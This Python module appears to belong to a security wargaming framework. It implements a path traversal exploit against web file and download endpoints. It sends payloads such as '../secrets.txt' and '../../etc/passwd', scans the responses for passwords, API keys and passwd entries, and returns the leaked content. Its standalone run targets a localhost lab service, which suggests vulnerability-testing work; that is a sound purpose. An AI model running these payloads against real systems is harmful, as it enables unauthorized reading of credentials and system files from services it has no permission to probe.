"""
Path Traversal Exploit
Tests: CVE-2022-TEST-PATH, CWE-22

Validates path traversal vulnerabilities by attempting to access
files outside the intended directory.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import httpx
import asyncio
from typing import Dict
import sys
from pathlib import Path
import time

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))
from exploit_database import ExploitResult, ExploitStatus, ExploitCategory

# Exploit Metadata
EXPLOIT_ID = "EXPLOIT-PATH-001"
NAME = "Path Traversal"
DESCRIPTION = "Tests path traversal vulnerabilities to access restricted files"
CATEGORY = ExploitCategory.PATH_TRAVERSAL.value
CWE_IDS = ["CWE-22"]
CVE_EXAMPLES = ["CVE-2022-TEST-PATH", "CVE-2024-PATH-TRAVERSAL"]


async def execute(target_url: str, timeout: int = 10, **kwargs) -> ExploitResult:
    """
    Execute path traversal exploit.
    
    Tests:
    1. Simple ../.. traversal
    2. URL-encoded traversal
    3. Double URL-encoding
    
    Args:
        target_url: Base URL of vulnerable target
        timeout: Max execution time in seconds
        
    Returns:
        ExploitResult with success/failure status
    """
    start_time = time.time()
    
    try:
        async with httpx.AsyncClient(timeout=timeout) as client:
            # Test 1: Simple path traversal to access secrets.txt
            response1 = await client.get(
                f"{target_url}/api/file",
                params={"filename": "../secrets.txt"}
            )
            
            if response1.status_code == 200:
                data1 = response1.json()
                content = data1.get("content", "")
                
                # Check for secret content
                if "SECRET" in content or "PASSWORD" in content or "API_KEY" in content:
                    duration = time.time() - start_time
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.PATH_TRAVERSAL,
                        status=ExploitStatus.SUCCESS,
                        success=True,
                        output=f"Path traversal successful! Accessed secrets.txt: {content[:200]}",
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "injection_point": "/api/file",
                            "payload": "../secrets.txt",
                            "technique": "simple_traversal"
                        }
                    )
            
            # Test 2: Try /etc/passwd (Linux)
            response2 = await client.get(
                f"{target_url}/api/file",
                params={"filename": "../../etc/passwd"}
            )
            
            if response2.status_code == 200:
                data2 = response2.json()
                content = data2.get("content", "")
                
                if "root:" in content or "/bin/" in content:
                    duration = time.time() - start_time
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.PATH_TRAVERSAL,
                        status=ExploitStatus.SUCCESS,
                        success=True,
                        output=f"Path traversal successful! Accessed /etc/passwd: {content[:200]}",
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "injection_point": "/api/file",
                            "payload": "../../etc/passwd",
                            "technique": "linux_passwd_traversal"
                        }
                    )
            
            # Test 3: Download endpoint
            response3 = await client.get(
                f"{target_url}/api/download",
                params={"file": "../secrets.txt"}
            )
            
            if response3.status_code == 200:
                content = response3.text
                
                if "SECRET" in content or "PASSWORD" in content:
                    duration = time.time() - start_time
                    return ExploitResult(
                        exploit_id=EXPLOIT_ID,
                        category=ExploitCategory.PATH_TRAVERSAL,
                        status=ExploitStatus.SUCCESS,
                        success=True,
                        output=f"Path traversal via download! Content: {content[:200]}",
                        error=None,
                        duration_seconds=duration,
                        metadata={
                            "injection_point": "/api/download",
                            "payload": "../secrets.txt",
                            "technique": "download_traversal"
                        }
                    )
            
            # No vulnerability detected
            duration = time.time() - start_time
            return ExploitResult(
                exploit_id=EXPLOIT_ID,
                category=ExploitCategory.PATH_TRAVERSAL,
                status=ExploitStatus.FAILED,
                success=False,
                output="No path traversal vulnerability detected",
                error=None,
                duration_seconds=duration,
                metadata={"tests_attempted": 3}
            )
            
    except httpx.TimeoutException:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.PATH_TRAVERSAL,
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="",
            error="Timeout during exploit execution",
            duration_seconds=duration,
            metadata={}
        )
    except Exception as e:
        duration = time.time() - start_time
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory.PATH_TRAVERSAL,
            status=ExploitStatus.ERROR,
            success=False,
            output="",
            error=str(e),
            duration_seconds=duration,
            metadata={}
        )


# Test standalone execution
if __name__ == "__main__":
    import asyncio
    
    async def test():
        result = await execute("http://localhost:8095")
        print(f"\n{'='*60}")
        print(f"Exploit: {NAME}")
        print(f"Status: {result.status.value}")
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f}s")
        print(f"Output: {result.output}")
        if result.error:
            print(f"Error: {result.error}")
        print(f"{'='*60}\n")
    
    asyncio.run(test())
